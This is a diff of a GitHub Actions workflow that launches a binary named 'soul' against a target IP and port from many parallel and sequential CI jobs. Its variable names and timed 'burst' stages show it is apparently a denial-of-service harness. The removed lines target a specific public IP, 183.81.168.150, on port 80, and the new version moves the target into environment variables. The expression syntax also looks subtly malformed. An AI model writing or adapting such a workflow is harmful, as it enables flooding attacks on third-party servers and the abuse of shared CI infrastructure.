@@ -1,14 +1,23 @@
 name: soulcrack fucker
-on: [push]
+on: 
+  push:
+    branches:
+      - '*'
+
+env:
+  TARGET_IP: "127.0.0.1"
+  TARGET_PORT: "8080"
+  ATTACK_DURATION: "400"
 
 jobs:
   stage-0:
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [1,2,3,4,5]
+        n: [1, 2, 3, 4, 5]
     steps:
-      - uses: actions/checkout@v3
+      - name: Checkout code
+        uses: actions/checkout@v3
       
       - name: Install cpulimit
         run: |
@@ -18,16 +27,17 @@ jobs:
       - name: Run with CPU limit
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 183.81.168.150 80 10 400
+          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400
 
   stage-1:
     needs: stage-0
     runs-on: ubuntu-22.04
     strategy:
       matrix:
-        n: [1,2,3,4,5]
+        n: [1, 2, 3, 4, 5]
     steps:
-      - uses: actions/checkout@v3
+      - name: Checkout code
+        uses: actions/checkout@v3
       
       - name: Install cpulimit
         run: |
@@ -37,16 +47,17 @@ jobs:
       - name: Run with CPU limit
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 183.81.168.150 80 60 400
+          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } ${ env.ATTACK_DURATION } 400
 
   stage-2-calc:
     runs-on: ubuntu-latest
     outputs:
       matrix_list: ${ steps.calc.outputs.matrix_list }
     steps:
-      - id: calc
+      - name: Calculate matrix
+        id: calc
         run: |
-          NUM_JOBS=$(($60 / 10))
+          NUM_JOBS=$((${ env.ATTACK_DURATION } / 10))
           ARRAY=$(seq 1 $NUM_JOBS | jq -R . | jq -s -c .)
           echo "matrix_list=$ARRAY" >> $GITHUB_OUTPUT
 
@@ -56,9 +67,10 @@ jobs:
     strategy:
       max-parallel: 1
       matrix:
-        iteration: ${ fromJson(needs.stage-2-calc.outputs.matrix_list) }
+        iteration: ${ fromJSON(needs.stage-2-calc.outputs.matrix_list) }
     steps:
-      - uses: actions/checkout@v3
+      - name: Checkout code
+        uses: actions/checkout@v3
       
       - name: Install cpulimit
         run: |
@@ -68,4 +80,4 @@ jobs:
       - name: Sequential 10s Burst with CPU limit
         run: |
           chmod +x soul
-          cpulimit -l 50 -- ./soul 183.81.168.150 80 10 400
+          cpulimit -l 50 -- ./soul ${ env.TARGET_IP } ${ env.TARGET_PORT } 10 400
